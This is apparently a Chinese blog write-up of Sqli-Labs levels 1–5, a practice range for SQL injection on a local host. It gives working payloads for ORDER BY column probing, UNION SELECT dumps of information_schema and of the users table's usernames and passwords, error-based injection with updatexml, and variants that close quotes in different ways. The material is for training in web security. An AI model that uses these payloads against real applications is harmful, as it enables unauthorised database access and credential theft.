---
title: Sqli-Lab 靶场题解
published: 2025-07-14
description: 'Sqli-Labs 是一个专门用于练习 SQL 注入漏洞的开源靶场项目，由印度安全研究员 Dhurva 开发，本文记录了Sqli-Lab靶场的题目WP。项目地址:https://github.com/Audi-1/sqli-labs'
image: ''
tags: [sql注入]
category: '技术'
draft: false 
lang: ''
---

## 基础挑战 1-20关

### Less-1

经过检测为字符型

检测表的列数：

```shell
http://sqli.local/Less-1?id=1' order by 3%23
http://sqli.local/Less-1?id=1' order by 4%23
```

得出有三列，之后操作同less-2

```shell
http://sqli.local/Less-1/?id=-1' union select 1,database(),group_concat(table_name) FROM information_schema.tables WHERE table_schema="security"%23
```

![image-20250714154648520](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250714154649982.png)

### Less-2

测试数字型 or 字符型

```shell
#对比两个结果
http://sqli.local/Less-2/?id=1
http://sqli.local/Less-2/?id=2-1
```

 发现结果相同，为数字型

判断回显位

```shell
http://sqli.local/Less-2/?id=-1 union select 1,2,3
```

![image-20250714135418329](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250714135447824.png)

```shell
http://sqli.local/Less-2/?id=-1 union select 1,database(),version()%23
```

> %23经过转义后为#，代表注释符

![image-20250714135754885](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250714135756389.png)

得到数据库版本为5.7.40，可以用information_schema库查表名，列出security数据库中所有表名

```shell
http://sqli.local/Less-2/?id=-1 union select 1,database(),table_name FROM information_schema.tables WHERE table_schema="security"%23
```

![image-20250714140059376](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250714140059376.png)

但因为前端只能显示一个数据，所以需要将多条记录合成一条，用到**group_concat()**

```shell
http://sqli.local/Less-2/?id=-1 union select 1,database(),group_concat(table_name) FROM information_schema.tables WHERE table_schema="security"%23
```

![image-20250714140423164](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250714140424670.png)

得到security数据库中的表有emails，referers，usagents，users

泄露表中的字段信息：

```shell
http://sqli.local/Less-2/?id=-1 union select 1,database(),group_concat(column_name) FROM information_schema.columns WHERE table_schema="security" and table_name="emails"%23
http://sqli.local/Less-2/?id=-1 union select 1,database(),group_concat(column_name) FROM information_schema.columns WHERE table_schema="security" and table_name="referers"%23
http://sqli.local/Less-2/?id=-1 union select 1,database(),group_concat(column_name) FROM information_schema.columns WHERE table_schema="security" and table_name="usagents"%23
http://sqli.local/Less-2/?id=-1 union select 1,database(),group_concat(column_name) FROM information_schema.columns WHERE table_schema="security" and table_name="users"%23
```

查出user表中的所有数据

```shell
http://sqli.local/Less-2/?id=-1 union select 1,database(),group_concat(concat_ws("-",id,username,password)) FROM security.users
```

![image-20250714142402470](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250714142404372.png)

### Less-3

同Less-1,2，只是闭合方式不同：

```shell
# 闭合方式变为')
http://sqli.local/Less-2/?id=-1')
```

### Less-4

同上，但闭合方式不同

```shell
http://sqli.local/Less-4/?id=-1")
```

### Less-5

本关查询结果不会显

```shell
http://sqli.local/Less-5/?id=1' # 报错
http://sqli.local/Less-5/?id=1" # 没有报错
```

闭合方式为单引号

利用报错注入

```shell
http://sqli.local/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
```

![image-20250714152557928](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250714152559123.png)



